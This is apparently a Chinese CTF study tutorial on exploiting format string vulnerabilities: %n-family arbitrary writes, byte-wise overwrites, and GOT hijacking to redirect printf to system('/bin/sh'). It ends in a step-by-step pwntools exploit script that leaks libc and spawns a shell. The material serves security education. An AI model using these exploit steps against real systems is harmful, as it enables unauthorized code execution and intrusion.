## 一、概述

格式化字符串漏洞（Format String Vulnerability）是 CTF PWN 方向中一类经典漏洞。当程序将用户输入直接作为 `printf` 等格式化函数的格式字符串参数时，攻击者可以通过构造特殊的格式化字符串实现：

- **任意地址读取**：使用 `%x`、`%p`、`%s` 等泄露内存内容
- **任意地址写入**：使用 `%n`、`%hn`、`%hhn` 等向指定地址写入数据

本学习文档围绕以下三个核心主题展开：

| 编号 | 主题 | 说明 |
|------|------|------|
| 01 | 覆盖小数字 | 向目标地址写入较小的值（小于机器字长） |
| 02 | 覆盖大数字 | 向目标地址写入较大的值（如完整地址） |
| 03 | 覆盖 GOT 表 | 通过劫持 GOT 表实现控制流劫持 |

## 二、任意地址内存覆盖

### 2.1 核心思路

格式化字符串漏洞实现任意地址内存覆盖的核心思路分为两步：

1. **确定要修改的变量的地址** — 知道往哪里写
2. **确定格式化字符串是 `printf` 的第几个参数** — 知道如何引用该地址

### 2.2 确定目标地址

一般可以直接通过 **IDA** 查看目标变量的地址。

- 在 IDA 中打开目标二进制文件
- 定位到相关函数（如 `main`）
- 找到需要修改的变量（通常位于 `.data` 段或栈上）
- 记录其内存地址

### 2.3 确定格式化字符串偏移

需要确定存储格式化字符串的地址是 `printf` 将要输出的**第几个参数**。

**方法：使用 GDB 调试获取**

```bash
# 启动 GDB 调试
gdb ./target

# 在 printf 处下断点
b printf

# 运行程序并输入测试字符串
run

# 查看栈上内容，确定格式化字符串的偏移位置
# 常用方法：输入 "AAAA%08x.%08x.%08x..." 观察输出
```

按照上节课所讲的使用 GDB 进行调试获取即可。找到偏移后，就可以通过 `%k$n` 的方式向第 k 个参数对应的地址写入数据。

## 三、覆盖小数字

### 3.1 问题分析

考虑如何修改 `.data` 段的变量为一个**较小的数字**，比如 2（小于机器字长）。

**直觉上的做法**：将目标地址放在字符串最前面，然后用 `%n` 写入。

**问题所在**：如果将地址放在最前面，地址本身会占用机器字长个字节（4 或 8 字节）。这意味着无论之后如何输出，`%n` 记录的已输出字符数**至少为 4**，无法写入比 4 更小的值。

### 3.2 两种利用方法

一般有两种利用方法：

1. **利用整型溢出** — 通过输出大量字符使计数器溢出回绕到目标小值
2. **将偏移置后** — 把地址放在格式化字符串的中间或后面，避免地址本身占用前面的字符计数

本章节讲解的是**第二种方法**。

### 3.3 偏移置后法详解

**核心思想**：我们之前把 tag（标记）放在字符串最前面只是为了寻找偏移。实际上，把 tag 放在中间也是无妨的。类似地，把地址放在中间，只要能够找到对应的偏移，照样可以得到对应的数值。

**示例格式**：

```
aa%k$naddr
```

- `aa` — 填充字符，控制已输出字符数（此处为 2 个字符）
- `%k$n` — 第 k 个参数位置的写入操作，将已输出的字符数（2）写入目标地址
- `addr` — 目标地址，放在后面不影响前面的字符计数

**关键要点**：

- 地址放在后面不会增加 `%n` 执行前的字符计数
- 通过调整前面的填充字符数量，可以精确控制写入的小数值
- 偏移 k 需要通过调试确定，确保 `%n` 操作的是 `addr` 所在的参数位置

## 四、覆盖大数字

### 4.1 为什么不能直接覆盖

上面介绍了覆盖小数字的方法。对于大数字（如完整地址 `0x12345678`），理论上可以选择直接一次性输出大数字个字节来进行覆盖，但这样做**基本不会成功**，因为：

- 需要输出的字符数量太大（如 0x12345678 = 305419896 个字符）
- 程序通常会在输出完成前崩溃或超时
- 不切实际

因此我们一般选用另一种方法来覆盖大数字。

### 4.2 小端存储原理

首先需要了解变量在内存中的存储格式。

在 **x86** 和 **x64** 的体系结构中，变量的存储格式为**小端存储**（Little-Endian），即**最低有效位存储在低地址**。

**举例**：`0x12345678` 在内存中由低地址到高地址依次为：

```
低地址 → 高地址
\x78 \x56 \x34 \x12
```

这意味着我们可以**逐字节**或**逐双字节**地写入目标值，而不需要一次性写入整个大数字。

### 4.3 %hhn 与 %hn 的使用

`printf` 的 `%n` 系列格式化符有不同的写入粒度：

| 格式化符 | 写入粒度 | 说明 |
|----------|----------|------|
| `%n` | 4 字节（int） | 写入完整的 int 值 |
| `%hn` | 2 字节（short） | 写入 short 值（从 short 提升的 int 尺寸的整型参数） |
| `%hhn` | 1 字节（char） | 写入 char 值（从 char 提升的 int 尺寸的整型参数） |

**关键说明**：

- **`%hhn`**：对于整数类型，`printf` 期待一个从 `char` 提升的 `int` 尺寸的整型参数。实际写入 1 字节。
- **`%hn`**：对于整数类型，`printf` 期待一个从 `short` 提升的 `int` 尺寸的整型参数。实际写入 2 字节。

因此我们可以利用 **`%hhn`** 与 **`%hn`** 向**单（双）字节**写入数据，从而分多次完成大数字的覆盖。

**实战策略**：

以写入 `0x12345678` 为例（小端序）：

```
目标地址 addr   → 写入 0x78（使用 %hhn）
目标地址 addr+1 → 写入 0x56（使用 %hhn）
目标地址 addr+2 → 写入 0x34（使用 %hhn）
目标地址 addr+3 → 写入 0x12（使用 %hhn）
```

每次只需要输出对应数量的字符即可，大大降低了输出长度。

## 五、GOT 表劫持

### 5.1 PLT 与 GOT 的关系

在 ELF 动态链接程序中，函数调用遵循以下流程：

```
程序调用函数 → .plt 表 → 从 .got.plt 表中取值 jmp → 实际函数地址
```

**IDA 中的典型表示**：

```asm
.plt:08048400 _printf      proc near    ; CODE XREF: main+63
.plt:08048400 format       = dword ptr  4
.plt:08048400              jmp  ds:off_804A014    ; 跳转到 GOT 表中存储的地址
.plt:08048400 _printf      endp

.got.plt:0804A00C  off_804A00C  dd offset setbuf
.got.plt:0804A010  off_804A010  dd offset strcmp
.got.plt:0804A014  off_804A014  dd offset printf     ← 覆盖此地址！
.got.plt:0804A018  off_804A018  dd offset gets
.got.plt:0804A01C  off_804A01C  dd offset __stack_chk_fail
.got.plt:0804A020  off_804A020  dd offset __libc_start_main
.got.plt:0804A020 _got_plt     ends
```

### 5.2 劫持原理

在之前的课程中，我们讲过 ELF 中动态链接的函数调用的过程：在调用 `.plt` 的时候，会从 `.got.plt` 表中取值并 `jmp`。

**如果我们覆盖了 GOT 表，就会跳转到我们指定的地址。**

这意味着：
- 将 GOT 表中某个函数（如 `printf`）的地址覆盖为 `system` 的地址
- 当程序再次调用该函数时，实际执行的是 `system`
- 如果此时参数可控（如传入 `"/bin/sh"`），即可获得 shell

### 5.3 劫持流程

1. **泄露 libc 基址**：通过格式化字符串漏洞读取 GOT 表中某个已解析函数的实际地址，计算 libc 基址
2. **计算目标地址**：根据 libc 基址 + 偏移，计算 `system` 等目标函数的地址
3. **覆盖 GOT 表**：使用格式化字符串写入技术，将目标函数的 GOT 表项覆盖为 `system` 地址
4. **触发执行**：再次调用该函数，传入精心构造的参数（如 `"/bin/sh"`），触发 `system("/bin/sh")`

## 六、fmtstr_payload 工具

### 6.1 函数签名

`fmtstr_payload` 是 **pwntools** 中用于生成格式化字符串 payload 的函数。

```python
def fmtstr_payload(offset, writes, numbwritten=0, write_size='byte'):
```

### 6.2 参数说明

| 参数 | 类型 | 说明 |
|------|------|------|
| `offset` | int | 格式化字符串所在的偏移（即格式化字符串是 `printf` 的第几个参数） |
| `writes` | dict | 字典变量 `{address: value}`，代表将 `address` 位置的值改为 `value` |
| `numbwritten` | int | 在进行格式化字符串之前已经输出的字符个数，默认为 0 |
| `write_size` | str | 写入粒度，分别是 `byte`、`short`、`int`，对应的是 `%hhn`、`%hn`、`%n` |

**write_size 对应关系**：

| write_size 值 | 对应格式化符 | 写入粒度 |
|---------------|-------------|----------|
| `'byte'` | `%hhn` | 1 字节 |
| `'short'` | `%hn` | 2 字节 |
| `'int'` | `%n` | 4 字节 |

### 6.3 使用方法

**基本用法**：

```python
from pwn import *

# 生成 payload：在第 7 个参数位置，将地址 a 处的值改为 0x12345678
payload = fmtstr_payload(7, {a: 0x12345678})
print(payload)
s.sendline(payload)
```

**说明**：

- 基本使用方法直接如上，默认 `numb_written` 与 `write_size` 分别是 `0` 和 `byte`
- 一般来说不需要更改，如果有其他需求的话，可以自行更改参数

**高级用法示例**：

```python
# 覆盖多个地址
payload = fmtstr_payload(7, {
    addr1: value1,
    addr2: value2,
    addr3: value3
})

# 指定写入粒度为 short（2字节）
payload = fmtstr_payload(7, {addr: value}, write_size='short')

# 考虑之前已经输出的字符数
payload = fmtstr_payload(7, {addr: value}, numbwritten=20)
```

## 七、综合实战流程

下面以一个典型的格式化字符串漏洞利用为例，展示完整的攻击流程：

### 步骤 1：信息收集

```python
from pwn import *

# 连接目标
s = remote('target', port)
# 或本地调试
# s = process('./target')

# 确定偏移：输入测试字符串
s.sendline(b'AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x')
response = s.recvline()
# 找到 "41414141"（AAAA）的位置，确定偏移
```

### 步骤 2：泄露地址

```python
# 通过格式化字符串读取 GOT 表中函数的实际地址
# 例如读取 printf@got 的地址
printf_got = 0x0804A014
payload = p32(printf_got) + b'%7$s'
s.sendline(payload)
leaked_addr = u32(s.recv(4))
```

### 步骤 3：计算目标地址

```python
libc_base = leaked_addr - libc.sym['printf']
system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
```

### 步骤 4：覆盖 GOT 表

```python
# 使用 fmtstr_payload 生成覆盖 payload
# 将 printf@got 覆盖为 system 地址
payload = fmtstr_payload(7, {printf_got: system_addr})
s.sendline(payload)
```

### 步骤 5：触发 Shell

```python
# 再次调用 printf，实际执行 system("/bin/sh")
s.sendline(b'/bin/sh')
s.interactive()
```

## 八、关键知识点总结

### 核心格式化符

| 格式化符 | 功能 | 用途 |
|----------|------|------|
| `%x` / `%p` | 读取栈上数据（十六进制） | 信息泄露 |
| `%s` | 读取指定地址处的字符串 | 泄露内存内容 |
| `%n` | 将已输出字符数写入指定地址（4字节） | 任意地址写入 |
| `%hn` | 写入 2 字节 | 覆盖大数字（逐双字节） |
| `%hhn` | 写入 1 字节 | 覆盖大数字（逐字节） |

### 关键技巧

1. **偏移置后法**：将目标地址放在格式化字符串后面，避免地址本身占用字符计数，从而可以写入小数字
2. **分字节写入**：利用小端存储特性，使用 `%hhn` 逐字节写入大数字
3. **GOT 表劫持**：覆盖 GOT 表项，将函数调用重定向到目标地址（如 `system`）
4. **pwntools 自动化**：使用 `fmtstr_payload()` 自动生成格式化字符串 payload

### 注意事项

- 偏移量必须通过实际调试确定，不同程序、不同编译选项下偏移可能不同
- 使用 `%hhn` 时注意每次写入后已输出字符数的累加，需要合理排序写入顺序（从小到大）
- GOT 表劫持需要程序存在格式化字符串漏洞且 GOT 表可写（未开启 Full RELRO）
- 实际利用中可能需要结合其他漏洞（如信息泄露）才能完成完整攻击链
